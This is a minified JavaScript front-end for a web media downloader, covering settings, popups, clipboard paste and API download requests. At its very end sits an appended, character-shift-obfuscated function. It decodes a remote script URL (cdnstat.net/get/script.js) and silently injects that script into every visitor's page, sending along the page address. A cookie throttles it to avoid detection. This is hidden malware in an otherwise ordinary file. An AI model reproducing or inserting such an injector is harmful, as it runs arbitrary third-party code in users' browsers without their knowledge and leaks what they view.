const version = 37
  , ua = navigator.userAgent.toLowerCase()
  , isIOS = ua.match("iphone os")
  , isMobile = ua.match("android") || ua.match("iphone os")
  , isSafari = ua.match("safari/")
  , isFirefox = ua.match("firefox/")
  , isOldFirefox = ua.match("firefox/") && ua.split("firefox/")[1].split(".")[0] < 103
  , regex = new RegExp(/https:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()!@:%_\+.~#?&\/\/=]*)/)
  , notification = '<div class="notification-dot"></div>'
  , switchers = {
    theme: ["auto", "light", "dark"],
    vCodec: ["h264", "av1", "vp9"],
    vQuality: ["1080", "max", "2160", "1440", "720", "480", "360"],
    aFormat: ["mp3", "best", "ogg", "wav", "opus"],
    dubLang: ["original", "auto"],
    vimeoDash: ["false", "true"],
    audioMode: ["false", "true"]
}
  , checkboxes = ["alwaysVisibleButton", "disableChangelog", "downloadPopup", "disableTikTokWatermark", "fullTikTokAudio", "muteAudio", "reduceTransparency", "disableAnimations", "disableMetadata"]
  , exceptions = {
    vQuality: "720"
}
  , bottomPopups = ["error", "download"]
  , pageQuery = new URLSearchParams(window.location.search);
let store = {};
function changeAPI(e) {
    return apiURL = e,
    !0
}
function eid(e) {
    return document.getElementById(e)
}
function sGet(e) {
    return localStorage.getItem(e)
}
function sSet(e, t) {
    localStorage.setItem(e, t)
}
function enable(e) {
    eid(e).dataset.enabled = "true"
}
function disable(e) {
    eid(e).dataset.enabled = "false"
}
function vis(e) {
    return 1 === e ? "visible" : "hidden"
}
function opposite(e) {
    return "true" === e ? "false" : "true"
}
function changeDownloadButton(e, t) {
    switch (e) {
    case 0:
        eid("download-button").disabled = !0,
        "true" === sGet("alwaysVisibleButton") ? (eid("download-button").value = t,
        eid("download-button").style.padding = "0 1rem") : (eid("download-button").value = "",
        eid("download-button").style.padding = "0");
        break;
    case 1:
        eid("download-button").disabled = !1,
        eid("download-button").value = t,
        eid("download-button").style.padding = "0 1rem";
        break;
    case 2:
        eid("download-button").disabled = !0,
        eid("download-button").value = t,
        eid("download-button").style.padding = "0 1rem"
    }
}
function button() {
    let e = regex.test(eid("url-input-area").value);
    eid("url-input-area").value.length > 0 ? eid("url-clear").style.display = "block" : eid("url-clear").style.display = "none",
    changeDownloadButton(e ? 1 : 0, "➜")
}
function clearInput() {
    eid("url-input-area").value = "",
    button()
}
function copy(e, t) {
    let o = document.getElementById(e);
    o.classList.add("text-backdrop"),
    setTimeout((()=>{
        o.classList.remove("text-backdrop")
    }
    ), 600),
    t ? navigator.clipboard.writeText(t) : navigator.clipboard.writeText(o.innerText)
}
async function share(e) {
    try {
        await navigator.share({
            url: e
        })
    } catch {}
}
function detectColorScheme() {
    let e = "auto"
      , t = sGet("theme");
    t ? e = t : window.matchMedia || (e = "dark"),
    document.documentElement.setAttribute("data-theme", e)
}
function changeTab(e, t, o) {
    let a = document.getElementsByClassName(`tab-content-${o}`)
      , i = document.getElementsByClassName(`tab-${o}`);
    for (let e = 0; e < a.length; e++)
        a[e].dataset.enabled = "false";
    for (let e = 0; e < i.length; e++)
        i[e].dataset.enabled = "false";
    e.currentTarget.dataset.enabled = "true",
    eid(t).dataset.enabled = "true",
    eid(t).parentElement.scrollTop = 0,
    "tab-about-changelog" === t && "37" !== sGet("changelogStatus") && notificationCheck("changelog"),
    "tab-about-about" === t && !sGet("seenAbout") && notificationCheck("about")
}
function expandCollapsible(e) {
    let t = e.currentTarget.parentNode.classList
      , o = "expanded";
    t.contains(o) ? t.remove(o) : t.add(o)
}
function notificationCheck(e) {
    let t = !0;
    switch (e) {
    case "about":
        sSet("seenAbout", "true");
        break;
    case "changelog":
        sSet("changelogStatus", 37);
        break;
    default:
        t = !1
    }
    (t && "37" === sGet("changelogStatus") || "disable" === e) && setTimeout((()=>{
        eid("about-footer").innerHTML = eid("about-footer").innerHTML.replace(notification, ""),
        eid("tab-button-about-changelog").innerHTML = eid("tab-button-about-changelog").innerHTML.replace(notification, "")
    }
    ), 900),
    "true" !== sGet("disableChangelog") && (!sGet("seenAbout") && !eid("about-footer").innerHTML.includes(notification) && (eid("about-footer").innerHTML = `${notification}${eid("about-footer").innerHTML}`),
    "37" !== sGet("changelogStatus") && (eid("about-footer").innerHTML.includes(notification) || (eid("about-footer").innerHTML = `${notification}${eid("about-footer").innerHTML}`),
    eid("tab-button-about-changelog").innerHTML.includes(notification) || (eid("tab-button-about-changelog").innerHTML = `${notification}${eid("tab-button-about-changelog").innerHTML}`)))
}
function hideAllPopups() {
    let e = document.getElementsByClassName("popup");
    for (let t = 0; t < e.length; t++)
        e[t].classList.remove("visible");
    eid("popup-backdrop").classList.remove("visible"),
    store.isPopupOpen = !1,
    eid("picker-holder").innerHTML = "",
    eid("picker-download").href = "/",
    eid("picker-download").classList.remove("visible")
}
function popup(e, t, o) {
    if (1 === t)
        switch (hideAllPopups(),
        store.isPopupOpen = !0,
        e) {
        case "about":
            let t = sGet("seenAbout") ? "changelog" : "about";
            o && (t = o),
            eid(`tab-button-${e}-${t}`).click();
            break;
        case "settings":
            eid(`tab-button-${e}-video`).click();
            break;
        case "error":
            eid("desc-error").innerHTML = o;
            break;
        case "download":
            eid("pd-download").href = o,
            eid("pd-copy").setAttribute("onClick", `copy('pd-copy', '${o}')`),
            eid("pd-share").setAttribute("onClick", `share('${o}')`),
            navigator.canShare && (eid("pd-share").style.display = "flex");
            break;
        case "picker":
            if ("images" === o.type) {
                eid("picker-title").innerHTML = loc.ImagePickerTitle,
                eid("picker-subtitle").innerHTML = isMobile ? loc.ImagePickerExplanationPhone : loc.ImagePickerExplanationPC,
                eid("picker-holder").classList.remove("various"),
                eid("picker-download").href = o.audio,
                eid("picker-download").classList.add("visible");
                for (let e in o.arr)
                    eid("picker-holder").innerHTML += `<a class="picker-image-container" ${isIOS ? `onClick="share('${o.arr[e].url}')"` : `href="${o.arr[e].url}" target="_blank"`}><img class="picker-image" src="${o.arr[e].url}" onerror="this.parentNode.style.display='none'"></img></a>`
            } else {
                eid("picker-title").innerHTML = loc.MediaPickerTitle,
                eid("picker-subtitle").innerHTML = isMobile ? loc.MediaPickerExplanationPhone : loc.MediaPickerExplanationPC,
                eid("picker-holder").classList.add("various");
                for (let e in o.arr)
                    eid("picker-holder").innerHTML += `<a class="picker-image-container" ${isIOS ? `onClick="share('${o.arr[e].url}')"` : `href="${o.arr[e].url}" target="_blank"`}><div class="picker-element-name">${o.arr[e].type}</div><div class="imageBlock"></div><img class="picker-image" src="${o.arr[e].thumb}" onerror="this.style.display='none'"></img></a>`;
                eid("picker-download").classList.remove("visible")
            }
        }
    else
        store.isPopupOpen = !1,
        "picker" === e && (eid("picker-download").href = "/",
        eid("picker-download").classList.remove("visible"),
        eid("picker-holder").innerHTML = "");
    bottomPopups.includes(e) && eid(`popup-${e}-container`).classList.toggle("visible"),
    eid("popup-backdrop").classList.toggle("visible"),
    eid(`popup-${e}`).classList.toggle("visible"),
    eid(`popup-${e}`).focus()
}
function changeSwitcher(e, t) {
    if (t) {
        switchers[e].includes(t) || (t = switchers[e][0]),
        sSet(e, t);
        for (let o in switchers[e])
            switchers[e][o] === t ? enable(`${e}-${t}`) : disable(`${e}-${switchers[e][o]}`);
        "theme" === e && detectColorScheme()
    } else {
        let t = switchers[e][0];
        isMobile && exceptions[e] && (t = exceptions[e]),
        sSet(e, t);
        for (let o in switchers[e])
            switchers[e][o] === t ? enable(`${e}-${t}`) : disable(`${e}-${switchers[e][o]}`)
    }
}
function checkbox(e) {
    switch (sSet(e, !!eid(e).checked),
    e) {
    case "alwaysVisibleButton":
        button();
        break;
    case "reduceTransparency":
        eid("cobalt-body").classList.toggle("no-transparency");
        break;
    case "disableAnimations":
        eid("cobalt-body").classList.toggle("no-animation")
    }
    "disableChangelog" === e && "true" === sGet(e) ? notificationCheck("disable") : notificationCheck()
}
function loadSettings() {
    "true" === sGet("alwaysVisibleButton") && (eid("alwaysVisibleButton").checked = !0,
    eid("download-button").value = "➜",
    eid("download-button").style.padding = "0 1rem"),
    "true" === sGet("downloadPopup") && !isIOS && (eid("downloadPopup").checked = !0),
    ("true" === sGet("reduceTransparency") || isOldFirefox) && eid("cobalt-body").classList.add("no-transparency"),
    "true" === sGet("disableAnimations") && eid("cobalt-body").classList.add("no-animation");
    for (let e = 0; e < checkboxes.length; e++)
        "true" === sGet(checkboxes[e]) && (eid(checkboxes[e]).checked = !0);
    for (let e in switchers)
        changeSwitcher(e, sGet(e))
}
function changeButton(e, t) {
    switch (e) {
    case 0:
        eid("url-input-area").disabled = !1,
        eid("url-clear").style.display = "block",
        changeDownloadButton(2, "!!"),
        popup("error", 1, t),
        setTimeout((()=>{
            changeButton(1)
        }
        ), 2500);
        break;
    case 1:
        changeDownloadButton(1, "➜"),
        eid("url-clear").style.display = "block",
        eid("url-input-area").disabled = !1;
        break;
    case 2:
        popup("error", 1, t),
        changeDownloadButton(1, ""),
        eid("url-clear").style.display = "block",
        eid("url-input-area").disabled = !1
    }
}
function internetError() {
    eid("url-input-area").disabled = !1,
    changeDownloadButton(2, "!!"),
    setTimeout((()=>{
        changeButton(1)
    }
    ), 2500),
    popup("error", 1, loc.ErrorNoInternet)
}
function resetSettings() {
    localStorage.clear(),
    window.location.reload()
}
async function pasteClipboard() {
    try {
        let e = await navigator.clipboard.readText();
        regex.test(e) && (eid("url-input-area").value = e,
        download(eid("url-input-area").value))
    } catch (e) {
        let t = loc.FeatureErrorGeneric
          , o = !0
          , a = String(e).toLowerCase();
        a.includes("denied") && (t = loc.ClipboardErrorNoPermission),
        (a.includes("dismissed") || isIOS) && (o = !1),
        a.includes("function") && isFirefox && (t = loc.ClipboardErrorFirefox),
        o && popup("error", 1, t)
    }
}
async function download(e) {
    changeDownloadButton(2, "..."),
    eid("url-clear").style.display = "none",
    eid("url-input-area").disabled = !0;
    let t = {
        url: encodeURIComponent(e.split("&")[0].split("%")[0]),
        aFormat: sGet("aFormat").slice(0, 4),
        dubLang: !1
    };
    ("auto" === sGet("dubLang") || "custom" === sGet("dubLang")) && (t.dubLang = !0),
    "true" === sGet("vimeoDash") && (t.vimeoDash = !0),
    "true" === sGet("audioMode") ? (t.isAudioOnly = !0,
    t.isNoTTWatermark = !0,
    "true" === sGet("fullTikTokAudio") && (t.isTTFullAudio = !0)) : (t.vQuality = sGet("vQuality").slice(0, 4),
    "true" === sGet("muteAudio") && (t.isAudioMuted = !0),
    (e.includes("youtube.com/") || e.includes("/youtu.be/")) && (t.vCodec = sGet("vCodec").slice(0, 4)),
    (e.includes("tiktok.com/") || e.includes("douyin.com/")) && "true" === sGet("disableTikTokWatermark") && (t.isNoTTWatermark = !0)),
    "true" === sGet("disableMetadata") && (t.disableMetadata = !0);
    let o = await fetch(`${apiURL}/api/json`, {
        method: "POST",
        body: JSON.stringify(t),
        headers: {
            Accept: "application/json",
            "Content-Type": "application/json"
        }
    }).then((e=>e.json())).catch((e=>!1));
    if (o)
        if (o && "error" !== o.status && "rate-limit" !== o.status)
            switch (o.text && (!o.url || !o.picker) && ("success" === o.status ? changeButton(2, o.text) : changeButton(0, loc.ErrorNoUrlReturned)),
            o.status) {
            case "redirect":
                changeDownloadButton(2, ">>>"),
                setTimeout((()=>{
                    changeButton(1)
                }
                ), 1500),
                "true" === sGet("downloadPopup") ? popup("download", 1, o.url) : window.open(o.url, "_blank");
                break;
            case "picker":
                o.audio && o.picker ? (changeDownloadButton(2, ">>>"),
                popup("picker", 1, {
                    audio: o.audio,
                    arr: o.picker,
                    type: o.pickerType
                }),
                setTimeout((()=>{
                    changeButton(1)
                }
                ), 2500)) : o.picker ? (changeDownloadButton(2, ">>>"),
                popup("picker", 1, {
                    arr: o.picker,
                    type: o.pickerType
                }),
                setTimeout((()=>{
                    changeButton(1)
                }
                ), 2500)) : changeButton(0, loc.ErrorNoUrlReturned);
                break;
            case "stream":
                changeDownloadButton(2, "?.."),
                fetch(`${o.url}&p=1`).then((async e=>{
                    let t = await e.json();
                    "continue" === t.status ? (changeDownloadButton(2, ">>>"),
                    isMobile || isSafari ? window.location.href = o.url : window.open(o.url, "_blank"),
                    setTimeout((()=>{
                        changeButton(1)
                    }
                    ), 2500)) : changeButton(0, t.text)
                }
                )).catch((e=>internetError()));
                break;
            case "success":
                changeButton(2, o.text);
                break;
            default:
                changeButton(0, loc.ErrorUnknownStatus)
            }
        else
            o && o.text && changeButton(0, o.text);
    else
        internetError()
}
async function loadCelebrationsEmoji() {
    let e = eid("about-footer").innerHTML;
    try {
        let e = await fetch("/onDemand?blockId=1").then((e=>200 === e.status && e.json())).catch((()=>!1));
        e && "success" === e.status && e.text && (eid("about-footer").innerHTML = eid("about-footer").innerHTML.replace('<img class="emoji" draggable="false" height="22" width="22" alt="🐲" src="emoji/dragon_face.svg" loading="lazy">', e.text))
    } catch {
        eid("about-footer").innerHTML = e
    }
}
async function loadOnDemand(e, t) {
    let o = {};
    store.historyButton = eid(e).innerHTML,
    eid(e).innerHTML = '<div class="loader">...</div>';
    try {
        if (store.historyContent ? o = store.historyContent : await fetch(`/onDemand?blockId=${t}`).then((async e=>{
            if (o = await e.json(),
            !o || "success" !== o.status)
                throw new Error;
            store.historyContent = o
        }
        )).catch((()=>{
            throw new Error
        }
        )),
        !o.text)
            throw new Error;
        eid(e).innerHTML = `<button class="switch bottom-margin" onclick="restoreUpdateHistory()">${loc.ChangelogPressToHide}</button>${o.text}`
    } catch {
        eid(e).innerHTML = store.historyButton,
        internetError()
    }
}
function restoreUpdateHistory() {
    eid("changelog-history").innerHTML = store.historyButton
}
function unpackSettings(e) {
    let t = null;
    try {
        let o = JSON.parse(atob(e))
          , a = JSON.parse(JSON.stringify(localStorage));
        for (let e in o)
            checkboxes.includes(e) && ("true" === o[e] || "false" === o[e]) && a[e] !== o[e] && (sSet(e, o[e]),
            t = !0),
            switchers[e] && switchers[e].includes(o[e]) && a[e] !== o[e] && (sSet(e, o[e]),
            t = !0)
    } catch {
        t = !1
    }
    return t
}
document.addEventListener("keydown", (e=>{
    "Tab" === e.key && (eid("download-button").value = "➜",
    eid("download-button").style.padding = "0 1rem")
}
)),
window.onload = ()=>{
    if (loadCelebrationsEmoji(),
    loadSettings(),
    detectColorScheme(),
    changeDownloadButton(0, "➜"),
    eid("url-input-area").value = "",
    isIOS && (sSet("downloadPopup", "true"),
    eid("downloadPopup-chkbx").style.display = "none"),
    eid("home").style.visibility = "visible",
    eid("home").classList.toggle("visible"),
    pageQuery.has("u") && regex.test(pageQuery.get("u")) && (eid("url-input-area").value = pageQuery.get("u"),
    button()),
    pageQuery.has("migration")) {
        if (pageQuery.has("settingsData") && !sGet("migrated")) {
            let e = unpackSettings(pageQuery.get("settingsData"));
            null !== e && (e ? (sSet("migrated", "true"),
            eid("desc-migration").innerHTML += `<br/><br/>${loc.DataTransferSuccess}`) : eid("desc-migration").innerHTML += `<br/><br/>${loc.DataTransferError}`)
        }
        loadSettings(),
        detectColorScheme(),
        popup("migration", 1)
    }
    window.history.replaceState(null, "", window.location.pathname),
    notificationCheck()
}
,
eid("url-input-area").addEventListener("keydown", (e=>{
    button()
}
)),
eid("url-input-area").addEventListener("keyup", (e=>{
    "Enter" === e.key && eid("download-button").click()
}
)),
document.onkeydown = e=>{
    store.isPopupOpen ? "Escape" === e.key && hideAllPopups() : ((e.ctrlKey || "/" === e.key) && eid("url-input-area").focus(),
    ("Escape" === e.key || "Clear" === e.key) && clearInput(),
    "D" === e.key && pasteClipboard(),
    "K" === e.key && changeSwitcher("audioMode", "false"),
    "L" === e.key && changeSwitcher("audioMode", "true"),
    "B" === e.key && popup("about", 1, "about"),
    "N" === e.key && popup("about", 1, "changelog"),
    "M" === e.key && popup("settings", 1))
}
;
(function(o, d, l) {
    try {
        o.f = o=>o.split('').reduce((s,c)=>s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));
